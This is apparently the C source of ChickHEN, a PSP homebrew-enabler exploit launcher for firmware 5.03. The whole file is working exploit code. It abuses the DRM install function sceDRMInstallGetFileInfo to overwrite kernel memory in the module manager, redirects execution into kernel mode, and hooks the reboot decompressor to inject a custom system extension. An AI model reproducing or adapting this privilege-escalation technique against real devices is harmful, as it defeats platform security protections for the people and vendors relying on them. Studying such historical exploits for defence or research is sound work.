/*
	ChickHEN by Davee
	Exploit launcher :-)
*/

#include "tiff_sdk.h"
#include "systemex.h"

u32 vshinstall_addr, devkit, model;

/* Some useful info */
#define LOADCORE_ADDR 0x88016600
#define SYSMEM_ADDR 0x88000000
#define RED 0x000000FF
#define WHITE 0x00FFFFFF
#define BLUE 0x00FF0000
#define GREEN 0x0000FF00
#define ORANGE 0x0000aeff

static int MODULEMGR_ADDR;
#define KMODE_ADDR 0x8805C300

/* Defines */
static __inline__ u32 _lw(u32 addr) { return *(u32 *)addr; }
static __inline__ void _sw(u32 val, u32 addr) { *(u32 *)addr = val; }

#define MAKE_CALL(a, f) _sw(0x0C000000 | (((u32)(f) >> 2)  & 0x03ffffff), a)
#define REDIRECT_FUNCTION(a, f) _sw(0x08000000 | (((u32)(f) >> 2)  & 0x03ffffff), a);  _sw(0, a+4);
#define MIPS_JAL(f) (0x0C000000 | (((u32)(f) >> 2)  & 0x03ffffff))
#define MIPS_J(f) (0x08000000 | (((u32)(f) & 0x0ffffffc) >> 2))

typedef struct
{
	u32 hidetiff;
	u32 hidecorrupt;
	u32 spoofversion;
	u32 spoofmac;
	u32 usehenupdater;
	u32 spoof_firmware;
	u32 spoof3k;
	u32 usenandguard;
	u32 configflash1;
} ChickHENConfig;

ChickHENConfig config;

/* Paf imports */
u32 (* strlen)(const char *str);
int (* sceKernelStartThread)(SceUID thid, int unk, void *unk2);
SceUID (* sceKernelCreateThread)(const char *name, void *entry, int initPriority, int stackSize, SceUInt attr, void *option);
void (* memset)(void *ptr, u8 val, u32 len);
int (* strcpy)(char *str1, const char *str2);
int (* strcmp)(const char *str1, const char *str2);
SceUID (* sceIoOpen)(const char *file, int flags, SceMode mode);
int (* sceIoWrite)(SceUID fd, void *addr, SceSize len);
int (* sceIoRead)(SceUID fd, void *addr, SceSize len) = NULL;
u32 (* sceIoLseek)(SceUID , int , int) = NULL;
int (* sceIoClose)(SceUID fd);
int (* sceKernelStartModule)(SceUID modid, SceSize argsize, void *argp, int *status, SceKernelSMOption *option);
void (* sceKernelDcacheWritebackAll)(void);
int (* sceKernelDelayThread)(int milliseconds);
int (* vshKernelGetModel)(void);

/* Vshmain imports */
SceUID (* vshKernelLoadModuleVSH)(const char *file, int unk, SceKernelLMOption *option);

/* Customized modulemgr imports */
int (* henKernelMemset)(void *dst, u8 byte, SceSize size);
void *(* henKernelStart)();

/* Psheet imports */
int (* sceDRMInstallInit)(int a0, int a1);
int (* sceDRMInstallGetFileInfo)(const char *file, int a1, int a2, void *a3);

/* Kernel imports */
void (* sceKernelIcacheInvalidateAll)(void) = (void *)(SYSMEM_ADDR + 0x00000C90);
void (* sceKernelDcacheWritebackInvalidateAll)(void) = (void *)(SYSMEM_ADDR + 0x000006FC);
SceModule2 *(* sceKernelFindModuleByName)(const char *modname) = (void *)(LOADCORE_ADDR+0x78EC);
int (* DecompressReboot)(u32 addr, u32 size, void *unk, void *unk2, void *unk3);

void ClearCaches()
{
	sceKernelIcacheInvalidateAll();
	sceKernelDcacheWritebackInvalidateAll();
}

 u32 typhoonFindFunction(const char *name, const char *lib, u32 nid)
{
	int i = 0, u;
	
	SceModule2 *mod = sceKernelFindModuleByName(name);
	
	int entry_size = mod->ent_size;
	int entry_start = (int)mod->ent_top;
	
	while (i < entry_size)
	{
		SceLibraryEntryTable *entry = (SceLibraryEntryTable *)(entry_start + i);
		
		if (entry->libname && (strcmp(entry->libname, lib) == 0))
		{
			u32 *table = entry->entrytable;
			int total = entry->stubcount + entry->vstubcount;
			
			if (total > 0)
			{ 
				for (u = 0; u < total; u++)
				{ 
					if(table[u] == nid)
					{
						return table[u + total];
					}
				} 
			} 	
		}
		
		i += (entry->len * 4);
	}
	
	return 0;
}

void DisplayColour(u32 colour)
{
	int i;
	
	for (i = 0x04400000; i < 0x04800000; i += 4)
	{
		((u32 *)i)[0] = colour;
	}
}

void ClearCachesForUser() //Fixed by Davee for R3
{
	int i = 0;
	int loop_n = 100000;
	
	sceKernelDcacheWritebackAll();
	
	extern void long_loop();
	long_loop();
}

int WriteFile(char *file, void *buf, int size)
{
	SceUID fd = sceIoOpen(file, PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
	
	if (fd < 0)
	{
		return fd;
	}

	int written = sceIoWrite(fd, buf, size);

	sceIoClose(fd);
	return written;
}

void Error(const char *str)
{
	WriteFile("ms0:/hen_error.txt", str, strlen(str));
	while (1) DisplayColour(RED);
}

void scePafModuleInit(int a0, int a1, int a2)
{
	/* We've got that precious address now */
	vshinstall_addr = a2-0x3fd8;
}

int DecompressRebootPatched(u32 addr, u32 size, void *unk, void *unk2, void *unk3)
{
	int i;

	*(int *)(0x88fc0000) = size_systemex;
	*(int *)(0x88fc0004) = model;
	*(int *)0x88FC0008 = 0;
	*(int *)0x88FC0010 = 0;
	
	for (i = 0; i < sizeof(ChickHENConfig); i++)
		((u8 *)0x88FC0020)[i] = ((u8 *)&config)[i];
	
	for (i = 0; i < size_systemex; i++)
		((u8 *)0x88fb0000)[i] = systemex[i];

	return DecompressReboot(addr, size, unk, unk2, unk3);
}

void KernelMode(SceSize args, void *argp)
{
	DisplayColour(GREEN);
	
	SceModule2 *mod = sceKernelFindModuleByName("sceLoadExec");
	u32 text_addr = mod->text_addr;

	DecompressReboot = (void *)text_addr;
	_sw(0x3C0188fb, text_addr + 0x00002820);
	MAKE_CALL(text_addr + 0x000027DC, DecompressRebootPatched);
	
	ClearCaches();
	DisplayColour(GREEN);
	
	int (* sceKernelExitVSHVSH)(void *ptr) = (void *)(text_addr + 0x0000145C);
	
	if (sceKernelExitVSHVSH(NULL) < 0)
		DisplayColour(WHITE);
	
	return 0;
}

int RoosterThread(SceSize args, void *argp)
{
	DisplayColour(WHITE);
	u32 text_addr = *(u32 *)argp;
	
	/* Initialize all paf imports now */
	strcmp = (void *)(text_addr+0x141FAC);
	strlen = (void *)(text_addr+0x142114);
	strcpy = (void *)(text_addr+0x1420DC);
	memset = (void *)(text_addr+0x14113C);
	sceIoOpen = (void *)(text_addr+0x15EE70);
	sceIoRead = (void *)(text_addr + 0x15EE58);
	sceIoWrite = (void *)(text_addr+0x15EE40);
	sceIoClose = (void *)(text_addr+0x15EE60);
	henKernelMemset = (void *)(text_addr+0x15EEB0);
	henKernelStart = (void *)(text_addr+0x15EEA0);
	sceKernelDcacheWritebackAll = (void *)(text_addr+0x15EFC0);
	sceKernelStartModule = (void *)(text_addr+0x15EEA8);
	sceKernelDelayThread = (void *)(text_addr+0x15EEE0);
	vshKernelGetModel = (void *)(text_addr+0x15F1C0);
	REDIRECT_FUNCTION(text_addr+0x3E47C, scePafModuleInit);

	/* Initialize all vshmain imports now */
	/* Davee Edit: pfft, who needs vshmain? steal from paf ;) */
	devkit = _lw(text_addr+0x167BC0);
	vshKernelLoadModuleVSH = (void *)_lw(text_addr + 0x0018F4E8);
	
	if (devkit != 0x05000310)
	{
		Error("Error: Incompatible firmware. Only 5.03 is supported.");
	}
	
	model = vshKernelGetModel();
	
	if (model == 0)
	{
		MODULEMGR_ADDR = 0x8805C200;
	}
	else if (model == 1 || model == 2)
	{
		MODULEMGR_ADDR = 0x8805C300;
	}

	else
	{
		Error("Error: vshKernelGetModel returned unknown value.");
	}
	
	ClearCachesForUser();

	/* Off you go */
	SceKernelLMOption loadmodule;
	memset(&loadmodule, 0, sizeof(SceKernelLMOption));
	
	loadmodule.size = sizeof(SceKernelLMOption);
	loadmodule.mpidtext = 1;
	loadmodule.mpiddata = 1;
	loadmodule.position = 0;
	loadmodule.access = 1;
	
	SceUID modid = vshKernelLoadModuleVSH("flash0:/kd/psheet.prx", 0, &loadmodule);
	
	if (modid < 0)
		Error("Error: Could not load psheet.prx");
		
	if (sceKernelStartModule(modid, 0, NULL, NULL, NULL) < 0)
		Error("Error: Could not start psheet.prx");

	memset(&loadmodule, 0, sizeof(SceKernelLMOption));
	
	loadmodule.size = sizeof(SceKernelLMOption);
	loadmodule.mpidtext = 2;
	loadmodule.mpiddata = 2;
	loadmodule.position = 0;
	loadmodule.access = 1;

	modid = vshKernelLoadModuleVSH("flash0:/vsh/module/game_install_plugin.prx", 0, &loadmodule);
	
	if (modid < 0)
		Error("Error: Could not load game_install_plugin.prx.");
	
	/* Pass a random arg to make it happy */
	if (sceKernelStartModule(modid, 4, &text_addr, NULL, NULL) < 0)
		Error("Error: Could not start game_install_plugin.prx.");
	
	/* scePafModuleInit will be called any minute :-) */
	/* Wait for it... wait for it... */
	/* YAH! */

	sceDRMInstallInit = (void *)(vshinstall_addr+0x3488);
	sceDRMInstallGetFileInfo = (void *)(vshinstall_addr+0x3490); 
	
	if (sceDRMInstallInit(1, 0x20000) < 0)
	{
		Error("Error: Could not initialize exploit.");
	}
	
	/* We need 39 bytes for this exploit to work */
	SceUID fd = sceIoOpen("ms0:/egghunt.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
	
	if (fd < 0)
	{
		Error("Error: Couldn't create egghunt.bin.");
	}
	
	sceIoWrite(fd, (void *)0x08810000, 39);
	sceIoClose(fd);
	
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0x6AC);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0x78C);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0x8BC);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0x9C0);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0xAC4);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0xAD0);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0xBDC);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0xCE0);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0xDE4);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0xEE8);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0xFEC);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0x10F0);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0x11F4);
	sceDRMInstallGetFileInfo("ms0:/egghunt.bin", 0, 0, MODULEMGR_ADDR+0x1254);

	ClearCachesForUser();
	
	/* We've got our very own lib inside kmem now, where modulemgr is supposed to be :) */
	int i;
	u32 jump = MIPS_J((u32)KernelMode);

	for (i = 0; i < 4; i++)
	{
		henKernelMemset(MODULEMGR_ADDR+0x546C+i, ((char *)&jump)[i], 1);
	}
	
	henKernelMemset(MODULEMGR_ADDR+0x5470, 0, 4);
	
	/* We've made it... :o */ //Quick! Load Configuration!
	
	memset(&config, 0, sizeof(ChickHENConfig));
	config.usenandguard = 1;
	
	fd = sceIoOpen("flash1:/henconfig.bin", PSP_O_RDONLY, 0777);
	
	if (fd < 0)
	{
		fd = sceIoOpen("ms0:/henconfig.bin", PSP_O_RDONLY, 0777);
	}
	
	if (fd >= 0)
	{
		sceIoRead(fd, &config, sizeof(ChickHENConfig));
		sceIoClose(fd);
	}
	
	ClearCachesForUser();
	henKernelStart();
}

void entry(u32 text_addr) __attribute__ ((section (".text.start")));
void entry(u32 text_addr)
{
	/* Kill thread before it crashes */
	_sw(0, text_addr+0x138B50);
	MAKE_CALL(text_addr+0x138B4C, text_addr+0x15EF88);
	
	sceKernelStartThread = (void *)(text_addr+0x15EF00);
	sceKernelCreateThread = (void *)(text_addr+0x15EF50);

	/* Create exploit thread */
	SceUID thid = sceKernelCreateThread("RoosterThread", RoosterThread, 16, 0x10000, 0, NULL);
	
	if (thid >= 0)
	{
		sceKernelStartThread(thid, sizeof(u32), &text_addr);
	}
	
	while (1);
}